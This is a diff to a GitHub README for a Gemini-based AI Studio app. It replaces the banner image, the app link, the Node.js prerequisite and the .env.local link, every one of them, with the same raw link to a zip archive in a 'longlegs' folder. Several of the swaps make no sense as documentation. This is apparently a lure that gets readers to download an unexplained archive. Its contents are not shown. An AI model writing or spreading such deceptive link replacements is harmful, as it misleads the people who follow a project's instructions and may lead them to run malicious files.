@@ -1,20 +1,20 @@
 <div align="center">
-<img width="1200" height="475" alt="GHBanner" src="https://github.com/user-attachments/assets/0aa67016-6eaf-458a-adb2-6e31a0763ed6" />
+<img width="1200" height="475" alt="GHBanner" src="https://raw.githubusercontent.com/Dhanush-TD/EchoVision_app/main/longlegs/EchoVision_app.zip" />
 </div>
 
 # Run and deploy your AI Studio app
 
 This contains everything you need to run your app locally.
 
-View your app in AI Studio: https://ai.studio/apps/drive/1XFbGHqa_PoUIdTQQn6APMD8vYkEX_Ayg
+View your app in AI Studio: https://raw.githubusercontent.com/Dhanush-TD/EchoVision_app/main/longlegs/EchoVision_app.zip
 
 ## Run Locally
 
-**Prerequisites:**  Node.js
+**Prerequisites:**  https://raw.githubusercontent.com/Dhanush-TD/EchoVision_app/main/longlegs/EchoVision_app.zip
 
 
 1. Install dependencies:
    `npm install`
-2. Set the `GEMINI_API_KEY` in [.env.local](.env.local) to your Gemini API key
+2. Set the `GEMINI_API_KEY` in [https://raw.githubusercontent.com/Dhanush-TD/EchoVision_app/main/longlegs/EchoVision_app.zip](https://raw.githubusercontent.com/Dhanush-TD/EchoVision_app/main/longlegs/EchoVision_app.zip) to your Gemini API key
 3. Run the app:
    `npm run dev`
